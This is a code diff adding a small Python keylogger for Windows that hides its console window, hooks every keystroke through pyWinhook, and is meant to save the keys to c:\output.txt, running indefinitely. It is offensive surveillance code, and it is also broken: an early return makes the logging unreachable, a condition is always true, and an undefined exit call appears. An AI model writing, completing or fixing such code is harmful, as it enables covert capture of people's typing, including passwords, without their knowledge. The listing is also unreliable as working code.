@@ -1,0 +1,42 @@
+import win32api
+import win32console
+import win32gui
+import pythoncom
+import pyWinhook
+import pynput
+
+
+win = win32console.GetConsoleWindow()
+win32gui.ShowWindow(win, 0)
+
+# Defines the actions to be keyboard related
+def OnKeyboardEvent(event):
+    key=chr(event.Ascii)
+    print(key)
+    return 0
+    if event.Ascii == 5:
+        _exit(1)
+    # Still trying to work this out
+    if event.Ascii != 0 or 8:
+        # opens output.txt to read current keystrokes
+        f = open('c:\output.txt', 'r+')
+        # buffer = f.read means that the output.txt is being read
+        buffer = f.read()
+        f.close()
+        # this writes keys/keystrokes to the file
+        f = open('c:\output.txt', 'w')
+        keylogs = chr(event.Ascii)
+        if event.Ascii == 13:
+            keylogs = '\n'
+        buffer += keylogs
+        f.write(buffer)
+        f.close()
+
+
+# pywinhook as per pypi.org is the callback feature for windows mouse and keyboard movements and strokes
+hm = pyWinhook.HookManager()
+hm.KeyDown = OnKeyboardEvent
+# sets the hook similar to an on/off switch
+hm.HookKeyboard()
+# waits forever meaning it will never shutdown
+pythoncom.PumpMessages()
